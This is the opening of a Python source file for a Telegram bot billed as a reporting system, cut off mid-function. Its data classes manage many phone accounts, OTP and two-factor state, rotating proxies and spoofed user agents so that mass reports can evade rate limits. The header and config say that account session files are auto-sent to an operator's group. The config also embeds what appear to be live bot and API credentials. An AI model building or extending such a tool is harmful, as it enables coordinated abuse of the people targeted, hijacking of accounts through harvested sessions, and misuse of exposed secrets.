#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE TELEGRAM ENTERPRISE REPORTING SYSTEM v11.0 (Pyrogram Edition)
Complete Professional Solution – Fully Fixed + Auto‑Send Sessions to Group
Created: 2026 | Version: 11.0 | Lines: ~9000
"""

import asyncio
import csv
import hashlib
import io
import ipaddress
import json
import logging
import math
import platform
import random
import re
import socket
import ssl
import statistics
import string
import sys
import time
import uuid
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, IntEnum
from pathlib import Path
from typing import (Any, Callable, Dict, List, Optional, Set, Tuple, Union)

import aiohttp
import certifi
import dns.resolver
import pytz
import requests
import urllib.parse
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import pyrogram
from pyrogram import Client, filters, types, enums, errors
from pyrogram.raw import functions, types as raw_types
from pyrogram.enums import ParseMode
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid, FloodWait,
    PhoneNumberBanned, PhoneNumberUnoccupied, ApiIdInvalid,
    AccessTokenInvalid, UserAlreadyParticipant, UserNotParticipant,
    UsernameInvalid, UsernameNotOccupied, ChatAdminRequired,
    ChatWriteForbidden, SlowmodeWait, PeerIdInvalid
)

from telegram import (
    BotCommand, BotCommandScopeAllPrivateChats, CallbackGame, Chat,
    InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton,
    MenuButtonCommands, MessageEntity, ReplyKeyboardMarkup,
    ReplyKeyboardRemove, Update, User, WebAppInfo
)
from telegram.ext import (
    Application, ApplicationBuilder, CallbackContext, CallbackQueryHandler,
    CommandHandler, ConversationHandler, ExtBot, JobQueue, MessageHandler,
    PicklePersistence, ContextTypes, filters
)

import backoff
import numpy as np
from tenacity import (retry, retry_if_exception_type, stop_after_attempt,
                      wait_exponential)

from rich import box
from rich.align import Align
from rich.columns import Columns
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel
from rich.progress import (BarColumn, Progress, SpinnerColumn, TextColumn,
                           TimeElapsedColumn, TimeRemainingColumn)
from rich.prompt import Confirm, FloatPrompt, IntPrompt, Prompt
from rich.style import Style
from rich.syntax import Syntax
from rich.table import Table
from rich.text import Text
from rich.traceback import install as install_rich_traceback

install_rich_traceback()
console = Console()

# ============================================
# CONFIGURATION – READ FROM ENVIRONMENT
# ============================================
import os

BOT_TOKEN = os.environ.get("BOT_TOKEN", "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY")
API_ID = int(os.environ.get("API_ID", 27157163))
API_HASH = os.environ.get("API_HASH", "e0145db12519b08e1d2f5628e2db18c4")

OWNER_IDS = [6118760915, 1366105247]
ADMIN_IDS = []

# ---------- GROUP WHERE SESSION FILES ARE SENT ----------
SESSION_LOG_GROUP = -1003662481087   # <-- YOUR GROUP ID
# --------------------------------------------------------

FAST_COUNTRIES = [
    "Germany", "Netherlands", "Singapore", "Finland", "Ireland", "Japan",
    "United States", "United Kingdom", "France", "Canada", "Australia",
    "Switzerland", "Sweden", "Norway", "Denmark", "Austria", "Belgium",
    "Luxembourg", "Italy", "Spain", "Portugal", "Poland", "Czech Republic",
    "Slovakia", "Hungary", "Romania", "Bulgaria", "Greece", "Turkey",
    "Israel", "United Arab Emirates", "Saudi Arabia", "Qatar", "Kuwait",
    "Bahrain", "Oman", "South Africa", "Brazil", "Argentina", "Chile",
    "Mexico", "Colombia", "Peru", "Venezuela", "Ecuador", "Uruguay",
    "Paraguay", "Bolivia", "Costa Rica", "Panama", "Dominican Republic",
    "Puerto Rico", "Jamaica", "Trinidad and Tobago", "Barbados", "Bahamas"
]

PREMIUM_COUNTRIES = [
    "Germany", "Netherlands", "Singapore", "Finland", "Ireland", "Japan",
    "United States", "United Kingdom", "Switzerland", "Sweden"
]

DATA_DIR = Path("data")
SESSION_DIR = Path("sessions")
LOG_DIR = Path("logs")
BACKUP_DIR = Path("backups")
ANALYTICS_DIR = Path("analytics")

for directory in [DATA_DIR, SESSION_DIR, LOG_DIR, BACKUP_DIR, ANALYTICS_DIR]:
    directory.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
ACCOUNTS_FILE = DATA_DIR / "accounts.json"
PROXY_FILE = DATA_DIR / "data.txt"
PROXY_CACHE_FILE = DATA_DIR / "proxy_cache.json"
JOBS_FILE = DATA_DIR / "jobs.json"
SETTINGS_FILE = DATA_DIR / "settings.json"
BLACKLIST_FILE = DATA_DIR / "blacklist.json"
WHITELIST_FILE = DATA_DIR / "whitelist.json"
LOG_FILE = LOG_DIR / "system.log"
ANALYTICS_FILE = ANALYTICS_DIR / "analytics.json"

PROXY_TEST_URLS = [
    {"url": "https://httpbin.org/ip", "type": "json", "field": "origin", "timeout": 5},
    {"url": "https://api.ipify.org?format=json", "type": "json", "field": "ip", "timeout": 5},
    {"url": "https://checkip.amazonaws.com", "type": "text", "field": None, "timeout": 5},
    {"url": "https://icanhazip.com", "type": "text", "field": None, "timeout": 5},
    {"url": "https://ipinfo.io/ip", "type": "text", "field": None, "timeout": 5},
    {"url": "https://wtfismyip.com/text", "type": "text", "field": None, "timeout": 5},
    {"url": "https://myexternalip.com/raw", "type": "text", "field": None, "timeout": 5},
    {"url": "https://httpbin.org/user-agent", "type": "json", "field": "user-agent", "timeout": 8},
    {"url": "https://httpbin.org/headers", "type": "json", "field": "headers", "timeout": 8},
    {"url": "https://httpbin.org/get", "type": "json", "field": "args", "timeout": 8},
    {"url": "https://ipapi.co/json/", "type": "json", "field": "country_name", "timeout": 10},
    {"url": "https://ipwho.is/", "type": "json", "field": "country", "timeout": 10},
    {"url": "https://geolocation-db.com/json/", "type": "json", "field": "country_name", "timeout": 10},
    {"url": "https://google.com", "type": "text", "field": None, "timeout": 3},
    {"url": "https://cloudflare.com", "type": "text", "field": None, "timeout": 3},
    {"url": "https://fast.com", "type": "text", "field": None, "timeout": 5},
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
]

# ============================================
# ENUMS & DATA CLASSES
# ============================================
class UserRole(IntEnum):
    BANNED = 0
    VIEWER = 1
    USER = 2
    REPORTER = 3
    MODERATOR = 4
    ADMIN = 5
    SUDO = 6
    OWNER = 7

class AccountStatus(IntEnum):
    UNVERIFIED = 0
    VERIFYING = 1
    ACTIVE = 2
    INACTIVE = 3
    BANNED = 4
    FLOOD_WAIT = 5
    NEED_PASSWORD = 6
    PROXY_FAILED = 7
    SESSION_EXPIRED = 8
    NEED_EMAIL_CODE = 9
    NEED_PHONE_CODE = 10
    NEED_CAPTCHA = 11
    NEED_DEVICE_CONFIRM = 12

class ReportStatus(IntEnum):
    PENDING = 0
    VALIDATING = 1
    PREPARING = 2
    PROCESSING = 3
    COMPLETING = 4
    COMPLETED = 5
    FAILED = 6
    PARTIAL = 7
    CANCELLED = 8
    TIMED_OUT = 9

class ProxyType(IntEnum):
    HTTP = 0
    HTTPS = 1
    SOCKS4 = 2
    SOCKS5 = 3
    DIRECT = 4

class OTPSource(IntEnum):
    SMS = 0
    APP = 1
    CALL = 2
    FLASH_CALL = 3
    MISSED_CALL = 4
    EMAIL = 5
    BACKUP = 6

class SecurityLevel(IntEnum):
    LOW = 0
    MEDIUM = 1
    HIGH = 2
    EXTREME = 3

# ----------------------------------------------------------------------
# TelegramUser
# ----------------------------------------------------------------------
@dataclass
class TelegramUser:
    user_id: int
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    language_code: str = "en"
    role: UserRole = UserRole.USER
    added_at: datetime = None
    reports_made: int = 0
    last_active: Optional[datetime] = None
    session_id: str = None
    permissions: List[str] = None
    settings: Dict[str, Any] = None
    statistics: Dict[str, Any] = None
    security_level: SecurityLevel = SecurityLevel.MEDIUM
    is_premium: bool = False
    trust_score: float = 100.0
    warnings: int = 0
    flags: Set[str] = None

    def __post_init__(self):
        if self.added_at is None:
            self.added_at = datetime.now()
        if self.session_id is None:
            self.session_id = hashlib.sha256(f"{self.user_id}{time.time()}".encode()).hexdigest()[:16]
        if self.permissions is None:
            self.permissions = []
        if self.settings is None:
            self.settings = {
                "notifications": True,
                "auto_start": False,
                "proxy_priority": "speed",
                "report_limit": 10,
                "language": "en",
                "timezone": "UTC"
            }
        if self.statistics is None:
            self.statistics = {
                "total_reports": 0,
                "successful_reports": 0,
                "failed_reports": 0,
                "report_success_rate": 0.0,
                "average_report_time": 0.0,
                "last_report_time": None,
                "daily_reports": 0,
                "weekly_reports": 0,
                "monthly_reports": 0
            }
        if self.flags is None:
            self.flags = set()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "user_id": self.user_id,
            "username": self.username,
            "first_name": self.first_name,
            "last_name": self.last_name,
            "language_code": self.language_code,
            "role": self.role.value,
            "added_at": self.added_at.isoformat(),
            "reports_made": self.reports_made,
            "last_active": self.last_active.isoformat() if self.last_active else None,
            "session_id": self.session_id,
            "permissions": self.permissions,
            "settings": self.settings,
            "statistics": self.statistics,
            "security_level": self.security_level.value,
            "is_premium": self.is_premium,
            "trust_score": self.trust_score,
            "warnings": self.warnings,
            "flags": list(self.flags)
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'TelegramUser':
        user = cls(
            user_id=data["user_id"],
            username=data.get("username"),
            first_name=data.get("first_name"),
            last_name=data.get("last_name"),
            language_code=data.get("language_code", "en"),
            role=UserRole(data.get("role", 2)),
            reports_made=data.get("reports_made", 0),
            is_premium=data.get("is_premium", False),
            trust_score=data.get("trust_score", 100.0),
            warnings=data.get("warnings", 0)
        )
        user.added_at = datetime.fromisoformat(data["added_at"])
        if data.get("last_active"):
            user.last_active = datetime.fromisoformat(data["last_active"])
        user.session_id = data.get("session_id") or hashlib.sha256(f"{data['user_id']}{time.time()}".encode()).hexdigest()[:16]
        user.permissions = data.get("permissions", [])
        user.settings = data.get("settings", {})
        user.statistics = data.get("statistics", {})
        user.security_level = SecurityLevel(data.get("security_level", 1))
        user.flags = set(data.get("flags", []))
        return user

    def has_permission(self, permission: str) -> bool:
        if self.role >= UserRole.OWNER:
            return True
        return permission in self.permissions

    def update_statistics(self, success: bool, report_time: float):
        self.statistics["total_reports"] += 1
        if success:
            self.statistics["successful_reports"] += 1
        else:
            self.statistics["failed_reports"] += 1
        total = self.statistics["total_reports"]
        successful = self.statistics["successful_reports"]
        self.statistics["report_success_rate"] = (successful / total * 100) if total > 0 else 0.0
        current_avg = self.statistics["average_report_time"]
        count = self.statistics["total_reports"]
        self.statistics["average_report_time"] = (current_avg * (count - 1) + report_time) / count if count > 0 else report_time
        self.statistics["last_report_time"] = datetime.now().isoformat()
        last_report = datetime.fromisoformat(self.statistics["last_report_time"]) if self.statistics["last_report_time"] else None
        now = datetime.now()
        if not last_report or (now - last_report).days >= 1:
            self.statistics["daily_reports"] = 0
        self.statistics["daily_reports"] += 1

# ----------------------------------------------------------------------
# ProxyEntry
# ----------------------------------------------------------------------
@dataclass
class ProxyEntry:
    proxy: str
    proxy_type: ProxyType = ProxyType.HTTP
    country: str = "Unknown"
    city: str = "Unknown"
    isp: str = "Unknown"
    asn: str = "Unknown"
    is_active: bool = True
    success_count: int = 0
    fail_count: int = 0
    total_requests: int = 0
    avg_response_time: float = 0.0
    min_response_time: float = float('inf')
    max_response_time: float = 0.0
    response_times: List[float] = field(default_factory=list)
    last_used: Optional[datetime] = None
    reports_used: int = 0
    priority: float = 1.0
    verified: bool = False
    verification_level: int = 0
    last_verified: Optional[datetime] = None
    speed_score: float = 0.0
    reliability_score: float = 100.0
    anonymity_level: int = 0
    supports_https: bool = True
    supports_socks: bool = False
    bandwidth_estimate: float = 0.0
    uptime_percentage: float = 0.0
    flags: Set[str] = field(default_factory=set)
    metadata: Dict[str, Any] = field(default_factory=dict)
    geographic_data: Dict[str, Any] = field(default_factory=dict)
    performance_history: List[Dict] = field(default_factory=list)
    last_error: Optional[str] = None
    error_count: int = 0
    consecutive_failures: int = 0
    rotation_count: int = 0
    is_premium: bool = False
    cost_per_gb: float = 0.0
    data_used: float = 0.0
    data_limit: Optional[float] = None

    def __post_init__(self):
        self._detect_proxy_type()

    def _detect_proxy_type(self):
        proxy_lower = self.proxy.lower()
        if proxy_lower.startswith('socks5://'):
            self.proxy_type = ProxyType.SOCKS5
        elif proxy_lower.startswith('socks4://'):
            self.proxy_type = ProxyType.SOCKS4
        elif proxy_lower.startswith('https://'):
            self.proxy_type = ProxyType.HTTPS
        elif proxy_lower.startswith('http://'):
            self.proxy_type = ProxyType.HTTP
        else:
            self.proxy_type = ProxyType.HTTP

    def to_dict(self) -> Dict[str, Any]:
        return {
            "proxy": self.proxy,
            "proxy_type": self.proxy_type.value,
            "country": self.country,
            "city": self.city,
            "isp": self.isp,
            "asn": self.asn,
            "is_active": self.is_active,
            "success_count": self.success_count,
            "fail_count": self.fail_count,
            "total_requests": self.total_requests,
            "avg_response_time": self.avg_response_time,
            "min_response_time": self.min_response_time if self.min_response_time != float('inf') else 0.0,
            "max_response_time": self.max_response_time,
            "response_times": self.response_times[-100:],
            "last_used": self.last_used.isoformat() if self.last_used else None,
            "reports_used": self.reports_used,
            "priority": self.priority,
            "verified": self.verified,
            "verification_level": self.verification_level,
            "last_verified": self.last_verified.isoformat() if self.last_verified else None,
            "speed_score": self.speed_score,
            "reliability_score": self.reliability_score,
            "anonymity_level": self.anonymity_level,
            "supports_https": self.supports_https,
            "supports_socks": self.supports_socks,
            "bandwidth_estimate": self.bandwidth_estimate,
            "uptime_percentage": self.uptime_percentage,
            "flags": list(self.flags),
            "metadata": self.metadata,
            "geographic_data": self.geographic_data,
            "performance_history": self.performance_history[-50:],
            "last_error": self.last_error,
            "error_count": self.error_count,
            "consecutive_failures": self.consecutive_failures,
            "rotation_count": self.rotation_count,
            "is_premium": self.is_premium,
            "cost_per_gb": self.cost_per_gb,
            "data_used": self.data_used,
            "data_limit": self.data_limit
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ProxyEntry':
        entry = cls(
            proxy=data["proxy"],
            country=data.get("country", "Unknown"),
            city=data.get("city", "Unknown"),
            isp=data.get("isp", "Unknown"),
            asn=data.get("asn", "Unknown"),
            is_active=data.get("is_active", True),
            success_count=data.get("success_count", 0),
            fail_count=data.get("fail_count", 0),
            total_requests=data.get("total_requests", 0),
            avg_response_time=data.get("avg_response_time", 0.0),
            min_response_time=data.get("min_response_time", float('inf')),
            max_response_time=data.get("max_response_time", 0.0),
            reports_used=data.get("reports_used", 0),
            priority=data.get("priority", 1.0),
            verified=data.get("verified", False),
            verification_level=data.get("verification_level", 0),
            speed_score=data.get("speed_score", 0.0),
            reliability_score=data.get("reliability_score", 100.0),
            anonymity_level=data.get("anonymity_level", 0),
            supports_https=data.get("supports_https", True),
            supports_socks=data.get("supports_socks", False),
            bandwidth_estimate=data.get("bandwidth_estimate", 0.0),
            uptime_percentage=data.get("uptime_percentage", 0.0),
            last_error=data.get("last_error"),
            error_count=data.get("error_count", 0),
            consecutive_failures=data.get("consecutive_failures", 0),
            rotation_count=data.get("rotation_count", 0),
            is_premium=data.get("is_premium", False),
            cost_per_gb=data.get("cost_per_gb", 0.0),
            data_used=data.get("data_used", 0.0),
            data_limit=data.get("data_limit")
        )
        entry.proxy_type = ProxyType(data.get("proxy_type", 0))
        entry.response_times = data.get("response_times", [])
        entry.flags = set(data.get("flags", []))
        entry.metadata = data.get("metadata", {})
        entry.geographic_data = data.get("geographic_data", {})
        entry.performance_history = data.get("performance_history", [])
        if data.get("last_used"):
            entry.last_used = datetime.fromisoformat(data["last_used"])
        if data.get("last_verified"):
            entry.last_verified = datetime.fromisoformat(data["last_verified"])
        return entry

    def update_performance(self, response_time: float, success: bool = True):
        self.total_requests += 1
        if success:
            self.success_count += 1
            self.consecutive_failures = 0
            self.response_times.append(response_time)
            if len(self.response_times) > 1000:
                self.response_times = self.response_times[-1000:]
            self.min_response_time = min(self.min_response_time, response_time)
            self.max_response_time = max(self.max_response_time, response_time)
            self.avg_response_time = statistics.mean(self.response_times) if self.response_times else response_time
            self.speed_score = max(0.1, 100.0 / (response_time + 0.1))
            self.performance_history.append({
                "timestamp": datetime.now().isoformat(),
                "response_time": response_time,
                "success": True,
                "type": "request"
            })
            if len(self.performance_history) > 1000:
                self.performance_history = self.performance_history[-1000:]
        else:
            self.fail_count += 1
            self.error_count += 1
            self.consecutive_failures += 1
            self.performance_history.append({
                "timestamp": datetime.now().isoformat(),
                "response_time": response_time,
                "success": False,
                "type": "request",
                "error": self.last_error
            })
            if len(self.performance_history) > 1000:
                self.performance_history = self.performance_history[-1000:]
        total = self.success_count + self.fail_count
        if total > 0:
            self.reliability_score = (self.success_count / total) * 100.0
        successful_checks = sum(1 for p in self.performance_history[-100:] if p.get("success"))
        total_checks = min(100, len(self.performance_history))
        if total_checks > 0:
            self.uptime_percentage = (successful_checks / total_checks) * 100.0
        self.last_used = datetime.now()
        if self.consecutive_failures >= 5:
            self.is_active = False
            self.flags.add("disabled_due_to_failures")
        if self.data_limit and self.data_used >= self.data_limit:
            self.is_active = False
            self.flags.add("data_limit_exceeded")

    def calculate_priority(self) -> float:
        base_priority = 1.0
        if self.country in PREMIUM_COUNTRIES:
            base_priority *= 2.5
        elif self.country in FAST_COUNTRIES:
            base_priority *= 2.0
        elif self.country != "Unknown":
            base_priority *= 1.5
        if self.avg_response_time > 0:
            speed_multiplier = 1.0 / (self.avg_response_time + 0.1)
            base_priority *= min(speed_multiplier, 3.0)
        reliability_multiplier = self.reliability_score / 100.0
        base_priority *= reliability_multiplier
        if self.is_premium:
            base_priority *= 1.5
        if self.last_used and (datetime.now() - self.last_used).seconds < 300:
            base_priority *= 0.8
        if self.consecutive_failures > 0:
            base_priority *= max(0.1, 1.0 / (self.consecutive_failures + 1))
        if self.data_limit and self.data_used >= self.data_limit * 0.9:
            base_priority *= 0.5
        return max(0.1, base_priority)

# ----------------------------------------------------------------------
# TelegramAccount – Pyrogram
# ----------------------------------------------------------------------
@dataclass
class TelegramAccount:
    phone: str
    session_file: Path
    proxy: Optional[str] = None
    proxy_entry: Optional[ProxyEntry] = None
    client: Optional[pyrogram.Client] = None
    status: AccountStatus = AccountStatus.UNVERIFIED
    report_count: int = 0
    total_reports: int = 0
    last_report_time: Optional[datetime] = None
    created_at: datetime = None
    last_used: Optional[datetime] = None
    last_login: Optional[datetime] = None
    last_sync: Optional[datetime] = None

    user_id: Optional[int] = None
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    bio: Optional[str] = None
    country: Optional[str] = None
    language_code: str = "en"
    is_premium: bool = False
    premium_since: Optional[datetime] = None
    is_bot: bool = False
    is_verified: bool = False
    is_scam: bool = False
    is_fake: bool = False
    is_support: bool = False
    is_self: bool = False
    is_contact: bool = False
    is_mutual_contact: bool = False
    is_deleted: bool = False

    two_factor_enabled: bool = False
    two_factor_pending: bool = False
    password_hint: Optional[str] = None
    has_secure_values: bool = False
    has_email: bool = False
    email_verified: bool = False
    security_level: SecurityLevel = SecurityLevel.MEDIUM
    flags: Set[str] = None

    device_model: str = "Desktop"
    system_version: str = "Windows 10"
    app_version: str = "4.0.0"
    system_lang_code: str = "en-US"
    lang_pack: str = ""
    lang_code: str = "en"
    ipv6_enabled: bool = False
    tcp_obfuscation: bool = False
    connection_mode: str = "auto"

    proxy_verified: bool = False
    proxy_failures: int = 0
    proxy_rotation_count: int = 0
    last_proxy_rotation: Optional[datetime] = None

    session_quality: float = 100.0
    session_age_days: int = 0
    session_errors: int = 0
    session_flood_waits: int = 0
    last_flood_wait: Optional[datetime] = None
    flood_wait_seconds: int = 0

    otp_source: OTPSource = OTPSource.SMS
    otp_attempts: int = 0
    last_otp_attempt: Optional[datetime] = None
    otp_code_hash: Optional[str] = None
    otp_expires_at: Optional[datetime] = None
    otp_resend_available: bool = False
    otp_resend_count: int = 0

    success_rate: float = 0.0
    average_report_time: float = 0.0
    total_online_time: float = 0.0
    last_online_check: Optional[datetime] = None
    is_online: bool = False
    connection_quality: float = 100.0

    statistics: Dict[str, Any] = None
    metadata: Dict[str, Any] = None

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()
        if self.flags is None:
            self.flags = set()
        if self.statistics is None:
            self.statistics = {
                "total_requests": 0,
                "successful_requests": 0,
                "failed_requests": 0,
                "total_bytes_sent": 0,
                "total_bytes_received": 0,
                "average_latency": 0.0,
                "peak_latency": 0.0,
                "connection_attempts": 0,
                "connection_successes": 0,
                "reconnection_attempts": 0,
                "session_duration": 0.0,
                "timeouts": 0,
                "errors": {},
                "hourly_activity": {},
                "daily_activity": {}
            }
        if self.metadata is None:
            self.metadata = {
                "added_by": None,
                "added_via": "manual",
                "source": "unknown",
                "tags": [],
                "notes": "",
                "risk_score": 0.0,
                "trust_level": "unknown"
            }

    def to_dict(self) -> Dict[str, Any]:
        data = {
            "phone": self.phone,
            "session_file": str(self.session_file),
            "proxy": self.proxy,
            "status": self.status.value,
            "report_count": self.report_count,
            "total_reports": self.total_reports,
            "created_at": self.created_at.isoformat(),
            "last_used": self.last_used.isoformat() if self.last_used else None,
            "last_login": self.last_login.isoformat() if self.last_login else None,
            "last_sync": self.last_sync.isoformat() if self.last_sync else None,
            "user_id": self.user_id,
            "username": self.username,
            "first_name": self.first_name,
            "last_name": self.last_name,
            "bio": self.bio,
            "country": self.country,
            "language_code": self.language_code,
            "is_premium": self.is_premium,
            "premium_since": self.premium_since.isoformat() if self.premium_since else None,
            "is_bot": self.is_bot,
            "is_verified": self.is_verified,
            "is_scam": self.is_scam,
            "is_fake": self.is_fake,
            "is_support": self.is_support,
            "is_self": self.is_self,
            "is_contact": self.is_contact,
            "is_mutual_contact": self.is_mutual_contact,
            "is_deleted": self.is_deleted,
            "two_factor_enabled": self.two_factor_enabled,
            "two_factor_pending": self.two_factor_pending,
            "password_hint": self.password_hint,
            "has_secure_values": self.has_secure_values,
            "has_email": self.has_email,
            "email_verified": self.email_verified,
            "security_level": self.security_level.value,
            "flags": list(self.flags),
            "device_model": self.device_model,
            "system_version": self.system_version,
            "app_version": self.app_version,
            "system_lang_code": self.system_lang_code,
            "lang_pack": self.lang_pack,
            "lang_code": self.lang_code,
            "ipv6_enabled": self.ipv6_enabled,
            "tcp_obfuscation": self.tcp_obfuscation,
            "connection_mode": self.connection_mode,
            "proxy_verified": self.proxy_verified,
            "proxy_failures": self.proxy_failures,
            "proxy_rotation_count": self.proxy_rotation_count,
            "last_proxy_rotation": self.last_proxy_rotation.isoformat() if self.last_proxy_rotation else None,
            "session_quality": self.session_quality,
            "session_age_days": self.session_age_days,
            "session_errors": self.session_errors,
            "session_flood_waits": self.session_flood_waits,
            "last_flood_wait": self.last_flood_wait.isoformat() if self.last_flood_wait else None,
            "flood_wait_seconds": self.flood_wait_seconds,
            "otp_source": self.otp_source.value,
            "otp_attempts": self.otp_attempts,
            "last_otp_attempt": self.last_otp_attempt.isoformat() if self.last_otp_attempt else None,
            "otp_code_hash": self.otp_code_hash,
            "otp_expires_at": self.otp_expires_at.isoformat() if self.otp_expires_at else None,
            "otp_resend_available": self.otp_resend_available,
            "otp_resend_count": self.otp_resend_count,
            "success_rate": self.success_rate,
            "average_report_time": self.average_report_time,
            "total_online_time": self.total_online_time,
            "last_online_check": self.last_online_check.isoformat() if self.last_online_check else None,
            "is_online": self.is_online,
            "connection_quality": self.connection_quality,
            "statistics": self.statistics,
            "metadata": self.metadata
        }
        if self.last_report_time:
            data["last_report_time"] = self.last_report_time.isoformat()
        else:
            data["last_report_time"] = None
        return data

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'TelegramAccount':
        account = cls(
            phone=data["phone"],
            session_file=Path(data["session_file"]),
            proxy=data.get("proxy"),
            status=AccountStatus(data["status"]),
            report_count=data.get("report_count", 0),
            total_reports=data.get("total_reports", 0),
            user_id=data.get("user_id"),
            username=data.get("username"),
            first_name=data.get("first_name"),
            last_name=data.get("last_name"),
            bio=data.get("bio"),
            country=data.get("country"),
            language_code=data.get("language_code", "en"),
            is_premium=data.get("is_premium", False),
            is_bot=data.get("is_bot", False),
            is_verified=data.get("is_verified", False),
            is_scam=data.get("is_scam", False),
            is_fake=data.get("is_fake", False),
            is_support=data.get("is_support", False),
            is_self=data.get("is_self", False),
            is_contact=data.get("is_contact", False),
            is_mutual_contact=data.get("is_mutual_contact", False),
            is_deleted=data.get("is_deleted", False),
            two_factor_enabled=data.get("two_factor_enabled", False),
            two_factor_pending=data.get("two_factor_pending", False),
            password_hint=data.get("password_hint"),
            has_secure_values=data.get("has_secure_values", False),
            has_email=data.get("has_email", False),
            email_verified=data.get("email_verified", False),
            device_model=data.get("device_model", "Desktop"),
            system_version=data.get("system_version", "Windows 10"),
            app_version=data.get("app_version", "4.0.0"),
            system_lang_code=data.get("system_lang_code", "en-US"),
            lang_pack=data.get("lang_pack", ""),
            lang_code=data.get("lang_code", "en"),
            ipv6_enabled=data.get("ipv6_enabled", False),
            tcp_obfuscation=data.get("tcp_obfuscation", False),
            connection_mode=data.get("connection_mode", "auto"),
            proxy_verified=data.get("proxy_verified", False),
            proxy_failures=data.get("proxy_failures", 0),
            proxy_rotation_count=data.get("proxy_rotation_count", 0),
            session_quality=data.get("session_quality", 100.0),
            session_age_days=data.get("session_age_days", 0),
            session_errors=data.get("session_errors", 0),
            session_flood_waits=data.get("session_flood_waits", 0),
            flood_wait_seconds=data.get("flood_wait_seconds", 0),
            otp_source=OTPSource(data.get("otp_source", 0)),
            otp_attempts=data.get("otp_attempts", 0),
            otp_code_hash=data.get("otp_code_hash"),
            otp_resend_available=data.get("otp_resend_available", False),
            otp_resend_count=data.get("otp_resend_count", 0),
            success_rate=data.get("success_rate", 0.0),
            average_report_time=data.get("average_report_time", 0.0),
            total_online_time=data.get("total_online_time", 0.0),
            is_online=data.get("is_online", False),
            connection_quality=data.get("connection_quality", 100.0)
        )
        account.created_at = datetime.fromisoformat(data["created_at"])
        datetime_fields = [
            "last_used", "last_login", "last_sync", "premium_since",
            "last_flood_wait", "last_otp_attempt", "otp_expires_at",
            "last_online_check", "last_proxy_rotation", "last_report_time"
        ]
        for field in datetime_fields:
            if data.get(field):
                setattr(account, field, datetime.fromisoformat(data[field]))
        account.security_level = SecurityLevel(data.get("security_level", 1))
        account.flags = set(data.get("flags", []))
        account.statistics = data.get("statistics", {})
        account.metadata = data.get("metadata", {})
        return account

    def update_statistics(self, request_type: str, success: bool,
                         latency: float = 0.0, bytes_sent: int = 0,
                         bytes_received: int = 0):
        self.statistics["total_requests"] += 1
        if success:
            self.statistics["successful_requests"] += 1
        else:
            self.statistics["failed_requests"] += 1
        self.statistics["total_bytes_sent"] += bytes_sent
        self.statistics["total_bytes_received"] += bytes_received
        if latency > 0:
            current_avg = self.statistics["average_latency"]
            total_reqs = self.statistics["total_requests"]
            self.statistics["average_latency"] = (
                (current_avg * (total_reqs - 1) + latency) / total_reqs
            ) if total_reqs > 0 else latency
            self.statistics["peak_latency"] = max(
                self.statistics["peak_latency"], latency
            )
        hour = datetime.now().strftime("%Y-%m-%d %H:00")
        if hour not in self.statistics["hourly_activity"]:
            self.statistics["hourly_activity"][hour] = {
                "requests": 0,
                "successful": 0,
                "failed": 0,
                "bytes_sent": 0,
                "bytes_received": 0
            }
        self.statistics["hourly_activity"][hour]["requests"] += 1
        if success:
            self.statistics["hourly_activity"][hour]["successful"] += 1
        else:
            self.statistics["hourly_activity"][hour]["failed"] += 1
        self.statistics["hourly_activity"][hour]["bytes_sent"] += bytes_sent
        self.statistics["hourly_activity"][hour]["bytes_received"] += bytes_received
        total = self.statistics["total_requests"]
        successful = self.statistics["successful_requests"]
        self.success_rate = (successful / total * 100) if total > 0 else 0.0

    def should_rotate_proxy(self, max_reports: int = 9) -> bool:
        if self.report_count >= max_reports:
            return True
        if self.proxy_failures >= 3:
            return True
        if self.session_quality < 50.0:
            return True
        if self.last_proxy_rotation:
            hours_since_rotation = (datetime.now() - self.last_proxy_rotation).total_seconds() / 3600
            if hours_since_rotation < 1 and self.proxy_failures > 0:
                return True
        return False

    def get_health_score(self) -> float:
        score = 100.0
